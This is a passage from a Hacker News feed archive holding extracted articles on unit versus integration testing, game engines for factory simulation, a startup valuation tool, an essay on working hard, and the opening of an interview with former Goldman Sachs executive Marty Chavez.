            <guid isPermaLink="false">hacker-news-small-sites-25507952</guid>
            <pubDate>Tue, 22 Dec 2020 16:30:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unit Testing vs. Integration Testing]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25507873">thread link</a>) | @agbell
<br/>
December 22, 2020 | https://blog.earthly.dev/unit-vs-integration/ | <a href="https://web.archive.org/web/*/https://blog.earthly.dev/unit-vs-integration/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.earthly.dev/content/images/size/w300/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM.png 300w,
                            https://blog.earthly.dev/content/images/size/w600/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM.png 600w,
                            https://blog.earthly.dev/content/images/size/w1000/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM.png 1000w,
                            https://blog.earthly.dev/content/images/size/w2000/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.earthly.dev/content/images/size/w2000/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM.png" alt="Unit Testing vs Integration Testing">
            </figure>

            <section>
                <div>
                    <p>In 1998, Kent Beck wrote sUnit, a unit testing framework for SmallTalk. &nbsp;Beck later ported this framework to Java as jUnit. &nbsp;From there, xUnit frameworks spread to the most popular languages. Newer languages, like Golang and Rust, have incorporated testing into the compiler and standard library directly.</p><p>But unit testing is not the only game in town. &nbsp;There are also integration tests and performance tests and much more. &nbsp;In my mind, though, Integration tests and unit tests are the foundations of resilient software. So today let's look at the differences between the two and when you might prefer one or the other.</p><h2 id="what-is-a-unit">What Is a Unit?</h2><figure><img src="https://blog.earthly.dev/content/images/2020/11/Screen-Shot-2020-11-27-at-11.06.16-AM.png" alt="" srcset="https://blog.earthly.dev/content/images/size/w600/2020/11/Screen-Shot-2020-11-27-at-11.06.16-AM.png 600w, https://blog.earthly.dev/content/images/size/w1000/2020/11/Screen-Shot-2020-11-27-at-11.06.16-AM.png 1000w, https://blog.earthly.dev/content/images/2020/11/Screen-Shot-2020-11-27-at-11.06.16-AM.png 1034w" sizes="(min-width: 720px) 720px"><figcaption>A unit is the smallest piece of code that is logically separate&nbsp;</figcaption></figure><p>A unit test is a test that is testing the smallest possible pieces of code in isolation. What then is a unit? &nbsp;</p><p>The term unit comes from mathematics. &nbsp;The number 1 is considered the unit as it is the smallest natural number. &nbsp;It is the smallest positive yet whole number. &nbsp;By analogy, a unit of your source code is the smallest piece of code that is logically separate from the rest of the code. &nbsp;It is a whole piece, a logically distinct area code, and it is the smallest possible such piece.</p><p>In most programming languages your unit is going to be a function or method call.</p><p>The great thing about unit testing is that if your code is structured in small independent pieces then writing tests for them can be quite easy. &nbsp; This ease of writing means that unit testing can be done as you develop features.</p><p>In comparison to other forms of testing, the execution time of unit tests is quite small. This means that you can run unit tests very frequently. &nbsp;As software matures a suite of unit tests is a powerful tool for preventing regressions and easing maintenance costs.</p><h2 id="retroactive-unit-testing">Retroactive Unit Testing</h2><blockquote>When considering an effort to add unit tests to existing software, costs, as well as benefits, need to be considered. </blockquote><p>A key assumption of unit testing is that the software under test easily separates into distinct units. &nbsp;In software written without unit testing in mind, this assumption rarely holds. &nbsp;Adding unit tests to existing software is often a great way to stabilize it and prevent future regressions, but refactoring the code to support easy unit testing may require substantial effort and could even introduce new defects. &nbsp;When considering an effort to add unit tests to existing software, costs, as well as benefits, need to be considered. &nbsp;If you have working code, and if the code rarely needs to change, and if the code is not easily unit-testable the benefits may not warrant the costs. In such cases, consider leaning on integration tests to prevent defects in that area.</p><h2 id="what-is-an-integration-test">What Is an Integration Test?</h2><figure><img src="https://blog.earthly.dev/content/images/2020/11/Screen-Shot-2020-11-27-at-11.40.01-AM.png" alt="" srcset="https://blog.earthly.dev/content/images/size/w600/2020/11/Screen-Shot-2020-11-27-at-11.40.01-AM.png 600w, https://blog.earthly.dev/content/images/size/w1000/2020/11/Screen-Shot-2020-11-27-at-11.40.01-AM.png 1000w, https://blog.earthly.dev/content/images/2020/11/Screen-Shot-2020-11-27-at-11.40.01-AM.png 1036w" sizes="(min-width: 720px) 720px"><figcaption>Integration tests focus on the whole of the software stack</figcaption></figure><p>If the philosophy of unit testing is based on the insight that testing small independent pieces of code is a great way to prevent regressions then integration tests are based on the understanding that things often go wrong at the edges. &nbsp;The outside world is a messy place, and where it interacts with your code is usually where surprises happen.</p><p>You can achieve 100% code coverage with your unit tests but still, find your software fails. &nbsp;You might be trying to read a file from the wrong location, or your software might get unexpected output from a service that calls it or it might call a database in an invalid way.</p><p>Whereas unit tests should be quick to run and numerous, a great integration testing strategy should focus on a lesser number of high impact tests.</p><p>Those tests should cross all the lines that unit tests won't, writing to the file system, reaching out to external resources, and so on.</p><h2 id="when-integration-testing-gets-tricky">When Integration Testing Gets Tricky</h2><p>Certain truly external systems may be difficult to integrate into tests. &nbsp;This is because they have side effects in the real world that cannot be undone: &nbsp;A financial transaction, an email send, physically moving a paint robot. Before you give up and sidestep them in your testing, look around for solutions. &nbsp;</p><p>Many external systems will have a documented way to use them in an integration test. Payment processors often have test credit card numbers, and test users with test email accounts can be set up for testing delivery. &nbsp;</p><p>The closer integration tests are to real-world interactions the more likely they are to catch problems and provide real value.</p><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Service</th>
<th>Integration Test Strategy</th>
</tr>
</thead>
<tbody>
<tr>
<td>Amazon SES</td>
<td><a href="https://docs.aws.amazon.com/ses/latest/DeveloperGuide/send-email-simulator.html">Test email addresses</a><a></a></td>
</tr>
<tr>
<td>Paypal</td>
<td><a href="https://developer.paypal.com/docs/payflow/payflow-pro/payflow-pro-testing/">Test credit card numbers</a></td>
</tr>
<tr>
<td>UPS</td>
<td><a href="https://www.ups.com/us/en/help-center/sri/developer-instruct.page">Test api mode</a></td>
</tr>

</tbody>
</table><!--kg-card-end: html--><p>Imagine you are coding a simple e-commerce site, a simple miniature amazon.com. The details matter here so let's assume that you are going to use PostgreSQL as your datastore, PayPal for payments, UPS for shipping, and Amazon Simple Email Service for emailing invoices. &nbsp;</p><h3 id="unit-testing-">Unit Testing:</h3><p> Your unit testing strategy will be testing the logic of your application, in an isolated fashion. &nbsp;This may include:</p><ul><li>Testing that the tax calculating logic correctly calculates the taxes for various jurisdictions. &nbsp; </li><li>Testing that items placed into a cart data structure are correctly added up.</li><li>Testing that discount codes are properly applied.</li></ul><p>Each of these areas will likely have several tests. Each test will verify a small piece of functionality. Unit testing power comes from their number, simplicity, and their speed and ease of execution.</p><h3 id="integration-testing-">Integration Testing:</h3><p>Your integration testing on the other hand will focus on testing where your e-commerce code interacts with other systems. &nbsp;This means testing not just the integration with the data store but also with email sending services, payment services and more. These may include:</p><ul><li>Testing that the shipping rates can be retrieved from the external shipping service.</li><li>Testing that the invoices can be generated and properly sent out.</li><li>Testing that the order information can be persisted and properly retrieved from the datastore.</li><li>Testing that the transactions can be sent and properly processed from the payment processor.</li></ul><p>Each of these will likely be verified by one or two integration tests. These tests will be slower to run and probably involve some setup and teardown steps. &nbsp;The payoff is that the code coverage of each test will be quite large. &nbsp;These tests will generate value by catching problems that unit tests could never catch. &nbsp;However, the maintenance cost and execution time will be likely higher. <br></p><figure><img src="https://blog.earthly.dev/content/images/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM-1.png" alt="" srcset="https://blog.earthly.dev/content/images/size/w600/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM-1.png 600w, https://blog.earthly.dev/content/images/size/w1000/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM-1.png 1000w, https://blog.earthly.dev/content/images/size/w1600/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM-1.png 1600w, https://blog.earthly.dev/content/images/2020/11/Screen-Shot-2020-11-27-at-11.44.36-AM-1.png 2020w" sizes="(min-width: 720px) 720px"><figcaption>Time for a head to head comparison</figcaption></figure><p>So which type of test should be preferred? Neither alone is sufficient. &nbsp; Both are parts of a comprehensive testing plan. Let's compare them directly:</p><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Unit Tests</th>
<th>Integration Tests</th>
</tr>
</thead>
<tbody>
<tr>
<td>The goal is to make sure a peice of code works as expected</td>
<td>The goal is to make sure pieces of code, including external interfaces work together, as expected</td>
</tr>
<tr>
<td>Isolated</td>
<td>Integrated</td>
</tr>
    <tr>
<td>Quick to run</td>
<td>Slower to run</td>
</tr>
    <tr>
<td>Many in number</td>
<td>Fewer in number</td>
</tr>
    <tr>
<td>No access to file system, database or external services</td>
<td>Directly testing areas where software interacts with external systems</td>
</tr>
    <tr>
<td>Tests a single piece of functionality</td>
<td>Tests the interaction of several peices of functionality</td>
</tr>
    <tr>
<td>Minimal setup and teardown</td>
<td>May involve extensive setup and teardown of external resources like file systems of database state</td>
</tr>
        <tr>
<td>Stateless</td>
<td>Possibly Stateful</td>
</tr>

</tbody>
</table><!--kg-card-end: html--><h2 id="working-software-over-idealized-testing">Working Software Over Idealized Testing</h2><blockquote>Each situation is unique and advice that is written based on what works in other contexts should be not followed blindly.</blockquote><p>Now we understand that unit tests should not touch the file system and that integration tests should only integrate across loose components. But really, splitting testing into two clear-cut categories is a bit reductionist and if we focus only on the definition we lose sight of the goal, which is correct working software.</p><p>Some very thoughtful developers think <a href="https://dhh.dk/2014/tdd-is-dead-long-live-testing.html">unit tests can and should round trip to the database</a>. Others claim that unit tests are a wasted effort and coarse grain integration tests offer the most value. </p><p>The thing is that each situation is unique and advice that is written based on what works in other contexts should be not followed blindly. A question to keep in mind is what kind of defects would this test catch. If each test is written thoughtfully to improve software reliability, and if tests are removed when they no longer have value then the specific testing approach that delivers the most value for a particular project will be discovered over time.</p><h2 id="see-also">See Also</h2><ul><li><a href="https://blog.earthly.dev/youre-using-docker-compose-wrong/">You are using Docker Compose wrong</a></li><li><a href="https://docs.earthly.dev/guides/integration">Integration testing guide</a></li><li><a href="https://dev.to/adamgordonbell/how-to-make-integration-tests-less-flaky-bel">Making Integration tests less flaky</a></li></ul>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.earthly.dev/unit-vs-integration/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507873</guid>
            <pubDate>Tue, 22 Dec 2020 16:23:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why game engines will win factory simulation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25507698">thread link</a>) | @mallahan
<br/>
December 22, 2020 | https://simftw.com/Article04.html | <a href="https://web.archive.org/web/*/https://simftw.com/Article04.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<section>
<p><img src="https://simftw.com/media/img/ftw.png" alt="FTW"></p>

<p>In this article, we'll go through a number features which make game engines well suited to handle the complexity required to create realistic (useful) industrial simulations. But the main factor as to why their products will capture the market is <strong>funding</strong>. The factors include:</p>
<ul>
<li><a href="#funding">Funding</a></li>
<li><a href="#ecosystem">Ecosystem</a></li>
<li><a href="#developers--users">Developers &amp; Users</a></li>
<li><a href="#scalability">Scalability</a></li>
<li><a href="#photorealism">Photorealism</a></li>
<li><a href="#ai-machine-learning">AI, machine learning</a></li>
</ul>
<p>We'll see at the end whether these features add up to <a href="#disruptive-innovation">Disruptive Innovation</a>.</p>
<h2 id="backgrounder">Backgrounder</h2>
<p>Here we're talking about simulating machines and robots for factory automation that can be connected to an actual controller (PLC, robot) that will run in production. And we are only talking about discrete manufacturing. If you'd like more background information on this topic, see:</p>
<ul>
<li><a href="https://simftw.com/Article01.html">What is factory simulation?</a></li>
<li><a href="https://simftw.com/Article02.html">Options for factory simulation</a></li>
</ul>
<h2 id="funding">Funding</h2>
<p>Of all the platforms mentioned in <a href="https://simftw.com/Article02.html">Options for factory simulation</a> game engines (<a href="https://unity.com/" target="_blank">Unity</a>, <a href="https://www.unrealengine.com/" target="_blank">Unreal Engine</a>) are the most well capitalized. For instance, as of this writing: </p>
<ul>
<li>Unity (NYSE: <a href="https://ca.finance.yahoo.com/quote/U" target="_blank">U</a>) <strong>$41B</strong> market capitalization</li>
<li>Rockwell Automation (NYSE: <a href="https://ca.finance.yahoo.com/quote/ROK" target="_blank">ROK</a>) <strong>$29B</strong> market capitalization</li>
</ul>
<p>Neither of these companies are entirely focused on industrial simulation, but most of the investment Unity puts into its product will end up being valuable for simulation. Compare the small portion of Rockwell that is focused on simulation and it looks like Unity will have a significant advantage. </p>
<p>Unreal creates some of the <a href="https://www.epicgames.com/fortnite/en-US/home" target="_blank">most popular games</a> in the world and has millions in revenue and was recently <a href="https://www.wsj.com/articles/fortnite-creator-epic-games-valued-at-nearly-15-billion-1540577025" target="_blank">valued at $15B</a> USD. </p>
<p><img src="https://simftw.com/media/img/epic-val.PNG" alt="epic"></p>
<p>Any simulation package targeted only at industrial simulation is going to have trouble competing if their core functionality (say, robot programming) starts being migrated to the game engine platforms by 3rd parties. </p>
<h2 id="ecosystem">Ecosystem</h2>
<p>Both game engines have marketplaces, tutorials, YouTubers, conferences and more. If you are trying to build something, you'll more likely find help easily online than from an industrial software package support team.</p>
<h2 id="developers--users">Developers &amp; Users</h2>
<p>Because both packages are free to start, the number of students and hobbyists learning these packages is huge. Industrial packages are priced in the (tens of) thousands per seat which is a huge barrier to entry. Also, the aura of video games just makes learning these tools seem fun.</p>
<p>And as <a href="https://a16z.com/2011/08/20/why-software-is-eating-the-world/" target="_blank">software eats the world</a>, the game engine is the ideal environment to develop a simulation. It allows all the best coding practices, specifically:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Unit_testing#:~:text=Unit%20tests%20are%20typically%20automated,an%20individual%20function%20or%20procedure." target="_blank">Unit testing</a></li>
<li><a href="https://en.wikipedia.org/wiki/Version_control" target="_blank">Version control</a></li>
<li><a href="https://en.wikipedia.org/wiki/CI/CD" target="_blank">CI/CD</a></li>
<li><a href="https://en.wikipedia.org/wiki/Integrated_development_environment" target="_blank">IDE</a></li>
</ul>
<p>By comparison, many of the sim packages utilize scripting languages and store the code base as binaries along with the graphics files, etc. It makes it very difficult to utilize any of the above. And as the simulation becomes the source of truth for the machine being built, proper tracking of code will become very important.</p>
<h2 id="scalability">Scalability</h2>
<p>Video games are huge and complex. The investment in game engines to make developing these games easier will allow factory system simulations to benefit. They will enable both small scale physics-based simulations (loose parts in a bin, bowl feeders) and large scale material flow simulations. The key being that they accommodate both: you can drop the bowl feeder into the material flow sim. Other platforms may have trouble achieving this breadth and depth.</p>
<h2 id="photorealism">Photorealism</h2>
<p>Game engines are being used for <a href="https://www.unrealengine.com/en-US/industry/film-television" target="_blank">movies</a>, <a href="https://www.unrealengine.com/en-US/blog/forging-new-paths-for-filmmakers-on-the-mandalorian" target="_blank">TV</a> and <a href="https://unity.com/ray-tracing" target="_blank">product demos</a>. While this technology (from NVidia and others) will be used by many, game engines will be able to invest more into integrating the technology because they have multiple revenue sources to support it. </p>
<p>But, besides looking nice, why would you need photorealism? <a href="https://en.wikipedia.org/wiki/Machine_vision" target="_blank">Machine vision</a>. Seeing parts, barcodes, etc. is already very important for quality inspections and will become more so for vision guided robotics and more.</p>
<h2 id="ai-machine-learning">AI, machine learning</h2>
<p>Game engines are already being used to <a href="https://unity.com/solutions/automotive-transportation/autonomous-vehicle-training" target="_blank">train self-driving cars</a>. And Unity has <a href="https://unity3d.com/machine-learning" target="_blank">machine learning</a> built in. So, how could this be used in industrial automation? Well, probably many ways, but we'll point out the one way that would require a simulation: it is entirely possible that machines will not need programmers in the future; a goal will be set, a simulation created, and the <a href="https://en.wikipedia.org/wiki/Artificial_neural_network" target="_blank">neural network</a> will create the program. Tesla's head of AI states this is being done already and calls it <a href="https://youtu.be/y57wwucbXR8?t=217" target="_blank">Software 2.0</a>. While this is still a ways off, there are other applications for machine learning in conjunction with machine vision and robotics.</p>
<h2 id="disruptive-innovation">Disruptive Innovation</h2>
<p>This phrase was coined by <a href="https://en.wikipedia.org/wiki/Clayton_Christensen" target="_blank">Clayton Christensen</a> in his 1997 book <em><a href="https://en.wikipedia.org/wiki/The_Innovator%27s_Dilemma" target="_blank">The Innovator's Dilemma</a></em>. Does it apply here? Consider the expensive "industrial" or "enterprise" products that the industrial incumbents (Kuka, Siemens, Rockwell) offer while reviewing these <a href="https://online.hbs.edu/blog/post/4-keys-to-understanding-clayton-christensens-theory-of-disruptive-innovation" target="_blank">key points</a>:</p>
<blockquote>
<ol>
<li>Incumbent businesses innovate and develop their products or services in order to appeal to their most demanding and/or profitable customers, ignoring the needs of those downmarket.</li>
<li>Entrants target this ignored market segment and gain traction by meeting their needs at a reduced cost compared to what is offered by the incumbent.</li>
<li>Incumbents donâ€™t respond to the new entrant, continuing to focus on their more profitable segments.</li>
<li>Entrants eventually move upmarket by offering solutions that appeal to the incumbentâ€™s â€œmainstreamâ€ customers.
Once the new entrant has begun to attract the incumbent businessâ€™s mainstream customers en masse, disruption has occurred.</li>
</ol>
</blockquote>
<p>The game engines have already started moving into other spaces beyond video games. Industrial simulations are already being created by people who understand how to do this. It won't be long before there are polished products (either built with game engines or based within them). A few examples of companies building products within Unity:</p>
<ul>
<li><a href="https://www.scopear.com/" target="_blank">ScopeAR</a></li>
<li><a href="https://prespective-software.com/" target="_blank">Prespective</a></li>
<li><a href="https://formant.io/news-and-blog/2019/10/09/analytics/robots-are-hard-game-engines-are-not-why-we-built-our-own-simulator-using-unity/" target="_blank">Formant</a></li>
</ul>
<h2 id="wrap-up">Wrap up</h2>
<p>So, we're taking some guesses about the future here and asking people to do some lateral thinking and choose the best technology even though it's not yet ready for their industry. The best tech doesn't always win but the extreme funding and performance of the game engines gives them a huge advantage. </p>
<p>Why are they better for your company today? We'll try to answer that in the next article: </p>
<ul>
<li><a href="https://simftw.com/Article05.html">Can sim pay for itself?</a></li>
</ul>
<p>Read more: </p>
<ul>
<li><a href="https://simftw.com/Article01.html">What is factory simulation?</a></li>
<li><a href="https://simftw.com/Article02.html">Options for factory simulation</a></li>
<li><a href="https://simftw.com/Article03.html">Why use simulation?</a></li>
<li><a href="https://simftw.com/Article04.html">Why game engines will win factory simulation</a></li>
<li><a href="https://simftw.com/Article05.html">Can sim pay for itself?</a></li>
</ul>
</section>
</div></div>]]>
            </description>
            <link>https://simftw.com/Article04.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507698</guid>
            <pubDate>Tue, 22 Dec 2020 16:10:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Normie Test]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25507654">thread link</a>) | @krebs_liebhaber
<br/>
December 22, 2020 | http://dulm.blue/normie/ | <a href="https://web.archive.org/web/*/http://dulm.blue/normie/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://dulm.blue/normie/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507654</guid>
            <pubDate>Tue, 22 Dec 2020 16:07:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Startup Valuation Nest â€“ Check startup valuations in your industry]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25507578">thread link</a>) | @scherbak
<br/>
December 22, 2020 | https://unicorn-nest.com/valuation/ | <a href="https://web.archive.org/web/*/https://unicorn-nest.com/valuation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><p>Pick your stage and industry to see the <b>average startup valuation</b> in your vertical and how it changed since 2015,<br> check the <b>revenue to valuation multiplier</b>, and get a <b>list of top investors</b> in similar rounds.</p></div></div><div><div> <p><label>  </label> <label>  </label> <a href="" id="valuation_filter">Check valuation</a></p><p>Please pick both the stage and the industry to see the result.</p></div></div></section><section><div><div><p>Historic average valuations of <span id="seed_title"></span> rounds <span id="industry_title"></span> since 2015</p></div></div></section><section><div><div><p>Current revenue to valuation multiplier</p><div><p>Multiplier for <br><b>Agriculture</b> is</p><p><span>8.8</span> <span>*</span></p></div><p> * Multiply your annual revenue by the multiplier to check the approximate valuation of your startup. We calculated this number based on the most recent data.</p></div></div></section><section><div><div><p>Top 5 most active industry investors since 2015</p><div><table><thead><tr><th>Fund</th><th># of investments in<br> the vertical</th><th>% of portfolio<br> investments</th><th>Geo investment<br> focus</th><th>Headquarters</th></tr></thead><tbody><tr><td></td></tr></tbody></table><div><div><p>The data about investments is time-sensitive.</p><p>Learn what investors we consider the most relevant for you right now.</p></div></div></div></div></div></section><section><div><div><p>about Startup VAluation Nest</p><p>Unicorn Nest analytics team provides historical data on average startup valuation at the time of investment for <b>55 industry groups since 2015</b>.<br> All the data is based on <b>Unicorn Nest Dataset</b>, the most comprehensive, verified and constantly updated dataset of venture capital investors, startups and deals.</p></div></div></section><section></section></div></div>]]>
            </description>
            <link>https://unicorn-nest.com/valuation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507578</guid>
            <pubDate>Tue, 22 Dec 2020 16:00:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Should you Work Hard? (2019)]]>
            </title>
            <description>
<![CDATA[
Score 105 | Comments 149 (<a href="https://news.ycombinator.com/item?id=25507413">thread link</a>) | @axiomdata316
<br/>
December 22, 2020 | https://jacobobryant.com/post/2019/alignment/ | <a href="https://web.archive.org/web/*/https://jacobobryant.com/post/2019/alignment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Should you work hard? Depending on your definition of "hard," it's a
<a href="https://twitter.com/elonmusk/status/1067173497909141504" target="_blank">controversial question</a>. Let's assume a
baseline level of hardness is roughly 40 hours per week of mostly focused work.
In other words, this is your typical "good employee" at a 9-to-5: they do their
time and they do good work, then they go home and focus on other things. This
is very respectable.</p><p>What about going above and beyond? There are two sides to this. Bronnie Ware
says that one of the top five <a href="https://bronnieware.com/blog/regrets-of-the-dying/" target="_blank">regrets of the
dying</a> is "I wish I
hadn't worked so hard":</p><blockquote>
<p>This came from every male patient that I nursed. They missed their children's
youth and their partner's companionship. Women also spoke of this regret. But
as most were from an older generation, many of the female patients had not been
breadwinners. All of the men I nursed deeply regretted spending so much of
their lives on the treadmill of a work existence.</p>
</blockquote><p>On the other hand, we can probably all think of several highly successful people
who worked more than 40 hours per week. My favorite example is Henry Eyring, the
chemist. <a href="https://www.goodreads.com/book/show/2300985.Mormon_Scientist" target="_blank">His
biography</a> is one
of the few books I've read twice, and he's one of my personal role models. He
was ambitious, worked extremely hard and achieved a lotâ€”but he did this without
compromising on anything more important. He was a good husband, father, teacher
and leader. He touched the lives of many.</p><p>There are additional arguments for both sides of the debate. But what's the
resolution to this paradox? I think it's something that I've started calling
"alignment." Alignment is the situation in which there's a high correlation
between the effort you put into life and the good that comes out. In other
words, it's when your work is aligned with what's most important.</p><p>I hypothesize that the real problem with many of Bronnie
Ware's patients wasn't that they worked too hardâ€”the problem is that they
worked too hard on things that, at the end of the day, weren't as important to
them as they thought. Notice that the #1 regret was "I wish I'd had the
courage to live a life true to myself, not the life others expected of me."
Perhaps the regret of working too hard was really just a symptom of this deeper
regret.</p><p>If you want to spend your life working really hard, it's critical to mould
yourself and your situation until working hard is actually worth it. Otherwise
you have two bad choices:</p><ul>
<li>Work hard and later regret that you neglected more important things</li>
<li>Don't work hard and later regret that you didn't fulfill your dreams</li>
</ul><p>I really like <a href="http://blog.samaltman.com/how-to-be-successful" target="_blank">Sam Altman's
advice</a> on "how to
achieve outlier success." I think it describes well this idea of alignment:</p><p>(Update since this got on HN and some people are taking issue with part of the quote:
read the whole post, or at least the opening two paragraphs, the footnote, and the
parts of the quote I ellided.)</p><blockquote>
<p>Almost everyone I've ever met would be well-served by spending more time
thinking about what to focus on. It is much more important to work on the right
thing than it is to work many hours. Most people waste most of their time on
stuff that doesn't matter.</p>
<p>Once you have figured out what to do, be unstoppable about getting your small
handful of priorities accomplished quickly. I have yet to meet a slow-moving
person who is very successful. ...</p>
<p>You can get to about the 90th percentile in your field by working either smart
or hard, which is still a great accomplishment. But getting to the 99th
percentile requires both.... Working a lot comes with huge life trade-offs,
and it's perfectly rational to decide not to do it. But it has a lot of
advantages. ... And it's often really fun. One of the great joys in life is
finding your purpose, excelling at it, and discovering that your impact
matters to something larger than yourself.</p>
<p>It's not entirely clear to me why working hard has become a Bad Thing in
certain parts of the US.... I think people who pretend you can be super
successful professionally without working most of the time (for some period of
your life) are doing a disservice.</p>
<p>One more thought about working hard: do it at the beginning of your career. Hard
work compounds like interest, and the earlier you do it, the more time you have
for the benefits to pay off.</p>
</blockquote><p>I've had several different experiences with alignment over the past six years:</p><ul>
<li>
<p>For a large, early chunk of my mission, I was completely out of alignment.
I didn't enjoy being a missionary at allâ€”it was a living hellâ€”and it seemed
like our efforts didn't make a difference anyway.</p>
</li>
<li>
<p>I changed a lot partway through my mission. One of the things I most enjoyed
about the end of my mission was the satisfaction of working hard all day, every
day on something that mattered.</p>
</li>
<li>
<p>Although my experience at BYU was positive overall, there was lots of
pressure from the system to work very hard, even though a large chunk of my
time was spent on things that didn't contribute to my education (this
category includes a lot of homework, most lectures, and almost all exams).</p>
</li>
<li>
<p>Being an employee was alright. I went in with the desire to make a real
contribution to Lucid and I like to think I achieved that goal. Although it
wasn't the work I wanted to spend the rest of my life on, I did learn a lot
and the money I saved up is a great benefit to me now.</p>
</li>
<li>
<p>Now that I've quit my job and have become a startup founder, it's
the first time since my mission where
I feel that I have perfect alignment. I work a
lot, but it doesn't feel like work. I don't look forward to the weekends
anymore; I love every day. Things will get more stressful as we progress, but
I'm excited.</p>
</li>
</ul><p>For me, having alignment means being a startup founder because I'm ambitious and
there are specific things I want to buildâ€”I'm not satisfied by working on
whatever the company that hired me happens to be building. But all that being
said, alignment is important for everyone, regardless of what your individual
goals and desires are. As with most <a href="https://www.goodreads.com/book/show/18176747-the-hard-thing-about-hard-things" target="_blank">hard
things</a>,
there's no formula for alignment. You have to figure out what it means for you
and how to get it. But being aware of the concept is at least the first step.</p><p>I write this all as a reminder to myself. I hope my life never falls out
of alignment.</p></div></div>]]>
            </description>
            <link>https://jacobobryant.com/post/2019/alignment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507413</guid>
            <pubDate>Tue, 22 Dec 2020 15:48:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA['We haven't done a great job' explaining why Goldman is 'good for the planet']]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25507133">thread link</a>) | @smalera
<br/>
December 22, 2020 | https://www.businessofbusiness.com/articles/goldman-sachs-marty-chavez-interview/ | <a href="https://web.archive.org/web/*/https://www.businessofbusiness.com/articles/goldman-sachs-marty-chavez-interview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-section">
    <!-- .sidebar -->

    <section>
      
      

      <p><b></b><i><span></span></i><span>This month, former Goldman Sachs CIO, CFO, and Global Co-Head of Securities Marty Chavez sat down with the co-founder and CEO of The Business of Business and Thinknum Alternative Data, Gregory Ugwi.</span><span>&nbsp;The two discussed a broad range of topics, from Martyâ€™s time at Goldman Sachs to his views on universal basic income, alcoholism, and workplace diversity.&nbsp;</span></p>
<p><span>Marty Chavezâ€™s career lies right on the intersection of finance and technology. Chavez pioneered the integration of computer engineering into Goldmanâ€™s business model as a way to bring the bankâ€™s trading model into the 21st century.&nbsp;</span></p>
<p><span>A computer engineer himself, Chavez started out at Goldmanâ€™s J. Aron Currency and Commodities Division back in 1993, where he worked as a senior energy strategist, or â€œstratâ€ in Goldman speak. After a three-year stint with Credit Suisse, Chavez founded Kiodex, a web-based risk management company, where he served as chairman and CEO until his return to Goldman in 2005. And as Marty explains in the fireside chat, his pride prevented him from returning to the bank earlier. Then again, he added, he wouldnâ€™t have found the initiative to get his startup off the ground if heâ€™d stayed.&nbsp;</span></p>
<p><span>Despite his illustrious career, Chavez isnâ€™t your typical bank exec â€”&nbsp;heâ€™s Latino, openly gay, and far more open to the media than most who have worked at Goldman Sachs. As the most senior openly gay employee at the bank, Chavez arguably set an example for diversity in Wall Street. Last year, however, Chavez announced his retirement after 19 years with the bank.</span></p>
<p><iframe allowfullscreen="allowfullscreen" height="315" src="https://www.youtube.com/embed/m_2dZptn3fc" width="560"></iframe></p>
<p><span>Hereâ€™s the full transcript of the chat.</span></p>
<p><b>Gregory Ugwi: Welcome, Marty.&nbsp;</b></p>
<p><b>Marty Chavez:</b><span> Gregory, how are you?</span></p>
<p><b>Gregory Ugwi: Very well. The first question I'd like to start with would be SecDB. How did you begin to build that? Assuming today you had to take on such a challenge, how would you prepare? How would you learn to build something like that?&nbsp;</b></p>
<p><b>Marty Chavez:</b><span> You know secDB too, so you can assess for yourself whether it's led us up to the Wall Street Journal's billing or not. I'll tell you about how it showed up for me. I never planned a career in finance, never even occurred to me. Most of my college class, I'm in the class of '85, a lot of people went to Wall Street. The '87 crash happened, and then they went and did other things.&nbsp;</span></p>
<p><span>I basically don't know anybody from the class of '85 who's on Wall Street, but for me it was just a freak occurrence. I was in an MD PhD program and I was dissecting cadavers while the stock market crash happened, so I had other problems. Then just out of the blue, I got a letter from a headhunter, and this is in the days well before LinkedIn, where he had done some work. Armen, who you all know from Goldman, Armen Avanessians had told this headhunter, and this is 1993, "I want you to make a list of entrepreneurs in Silicon Valley with PhDs from Stanford in computer science." I was just on the list.&nbsp;</span></p>
